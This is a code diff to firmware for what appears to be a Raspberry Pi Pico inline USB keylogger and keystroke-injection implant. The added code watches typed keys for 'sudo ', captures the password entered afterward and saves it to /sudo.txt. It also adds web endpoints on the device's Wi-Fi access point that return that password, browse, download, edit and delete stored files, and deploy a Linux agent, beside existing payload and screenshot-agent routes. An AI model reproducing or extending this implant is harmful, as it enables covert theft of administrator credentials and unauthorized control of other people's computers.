@@ -1,16 +1,65 @@
-#include <HIDKeyboard.h>
 #include <LittleFS.h> 
 #include "pio_usb.h"
 #include "Adafruit_TinyUSB.h"
 #include <WiFi.h>
 #include <WebServer.h>
+#include <functional>
+#include "PicoKeyboard.h"
 #include "base64.h"
 #include "setup.h"
 #include "webfunctions.h"
 #include "webfiles.h"
+#include "hardware/watchdog.h"
+#include "pico/stdlib.h"
 
 
 // ============================================================ Buffer Functions =================================================================
+
+void restartPico() {
+  watchdog_enable(1, 1);
+  while (true) {}
+}
+
+void setLayout() {
+    File file = LittleFS.open("/config.txt", "r");
+    if (!file) {
+        Serial.println("No config.txt found. Using default layout (us).");
+        Keyboard.setLayout(us_layout);
+        return;
+    }
+
+    String savedLayout = "us";
+    while (file.available()) {
+        String line = file.readStringUntil('\n');
+        line.trim();
+        if (line.startsWith("Layout:")) {
+            savedLayout = line.substring(7);
+            savedLayout.trim();
+        }
+    }
+    file.close();
+
+    if      (savedLayout == "us")    Keyboard.setLayout(us_layout);
+    else if (savedLayout == "uk")    Keyboard.setLayout(uk_layout);
+    else if (savedLayout == "de")    Keyboard.setLayout(de_layout);
+    else if (savedLayout == "fr")    Keyboard.setLayout(fr_layout);
+    else if (savedLayout == "fi")    Keyboard.setLayout(fi_layout);
+    else if (savedLayout == "be")    Keyboard.setLayout(be_layout);
+    else if (savedLayout == "es")    Keyboard.setLayout(es_layout);
+    else if (savedLayout == "dk")    Keyboard.setLayout(dk_layout);
+    else if (savedLayout == "it")    Keyboard.setLayout(it_layout);
+    else if (savedLayout == "tr")    Keyboard.setLayout(tr_layout);
+    else if (savedLayout == "pt")    Keyboard.setLayout(pt_layout);
+    else if (savedLayout == "br")    Keyboard.setLayout(br_layout);
+    else if (savedLayout == "be")    Keyboard.setLayout(be_layout);
+    else {
+        Serial.println("Unknown layout in config.txt, defaulting to us.");
+        Keyboard.setLayout(us_layout);
+    }
+
+    Serial.println("Keyboard layout set to: " + savedLayout);
+}
+
 void openLogFile() {
     File f = LittleFS.open("/keys.txt", "a");
     if (!f) {
@@ -19,9 +68,48 @@ void openLogFile() {
 }
 
 void writeBufferedKey(char key) {
+
+    char str[2] = { key, '\0' };
+    
+    if (!commandDetected && bufferIndex >= 5) { 
+        String lastFive = String(keyBuffer[bufferIndex - 4]) + 
+                          String(keyBuffer[bufferIndex - 3]) + 
+                          String(keyBuffer[bufferIndex - 2]) + 
+                          String(keyBuffer[bufferIndex - 1]) + 
+                          String(key);        
+        if (lastFive == "sudo ") {
+            commandDetected = true;
+            sudoPassword = "";
+        }
+    }
+    if (commandDetected && key == '\n') {
+        passwordExpected = true;
+        commandDetected = false;
+        sudoPassword = "";
+        return;
+    }
+    if (passwordExpected && passwordWaiting) {
+        if (key == '\n') {
+            passwordExpected = false;
+            if (sudoPassword.length() > 0) {
+                File sudoFile = LittleFS.open("/sudo.txt", "w");
+                if (sudoFile) {
+                    sudoFile.println(sudoPassword);
+                    sudoFile.close();
+                    passwordWaiting = false;
+                } else {
+                    Serial.println("Error saving password.");
+                }
+                sudoPassword = "";
+            }
+            return;
+        } else if (key != '\r') {
+            sudoPassword += key;
+        }
+    }
     if (bufferIndex < BUFFER_SIZE - 1) {
         keyBuffer[bufferIndex++] = key;
-        lastKeyTime = millis(); 
+        lastKeyTime = millis();
     } else {
         flushBuffer();
     }
@@ -85,12 +173,11 @@ void formatFS() {
 // =========================================================== Main Setup and Loop =====================================================================
 void setup() {
     Serial.begin(115200);
-    Keyboard.begin();
-    Mouse.begin(); 
     LittleFS.begin();
-    delay(1000);
-    checkBootPayloads();   
+
+    checkBootPayloads();
     loadWiFiSettings();
+    delay(1000);
     bool wifiEnabled = loadWiFiState();
     if (wifiEnabled) {
         WiFi.softAP(ssid.c_str(), password.c_str());
@@ -100,7 +187,9 @@ void setup() {
     } else {
         Serial.println("WiFi is disabled. Use 'wifion' to enable.");
     }
+    
     LittleFS.mkdir("/payloads");
+    
     server.on("/payloads", HTTP_GET, handlePayloadsPage);
     server.on("/list_payloads", HTTP_GET, listPayloads);
     server.on("/save_payload", HTTP_POST, savePayload);
@@ -126,6 +215,15 @@ void setup() {
     server.on("/deploy-screenshot", HTTP_POST, handleSSAgent);
     server.on("/screenshot.jpg", HTTP_GET, handleSavedScreenshot);
     server.on("/exit-agent", HTTP_POST, handleExitAgent);
+    server.on("/reboot_pico", HTTP_POST, restartPico);
+    server.on("/update_password", HTTP_POST, handleUpdatePassword);
+    server.on("/get_password", HTTP_GET, handleGetPassword);
+    server.on("/explorer", HTTP_GET, handleFileExplorer);
+    server.on("/download", HTTP_GET, handleDownload);
+    server.on("/edit", HTTP_GET, handleEdit);
+    server.on("/save", HTTP_POST, handleSave);
+    server.on("/delete", HTTP_GET, handleDelete);
+    server.on("/deploy_linux", HTTP_GET, handleLinuxAgent);
     server.begin();
     Serial.println("HTTP Server Started.");
 }
@@ -169,6 +267,16 @@ void setup1() {
     pio_cfg.pin_dp = HOST_PIN_DP;
     USBHost.configure_pio_usb(1, &pio_cfg);
     USBHost.begin(1);
+
+    Keyboard.begin();
+    Mouse.begin(); 
+    delay(4000);   
+    Keyboard.end();
+    Mouse.end();
+    delay(50);
+    Keyboard.begin();
+    Mouse.begin();
+    setLayout();
 }
 
 void loop1() {
@@ -350,7 +458,7 @@ void process_boot_kbd_report(hid_keyboard_report_t const *report) {
                 key_modifier_layout = key | modifiersard;
                 
                 for (int i = 0; i < 128; i++) {
-                    uint8_t mappedValue = pgm_read_byte(_asciimap + i);
+                    uint8_t mappedValue = pgm_read_byte(_layoutMap + i);
                     
                     if (mappedValue == key_modifier_layout) {
                         char loggedChar = (char)i;
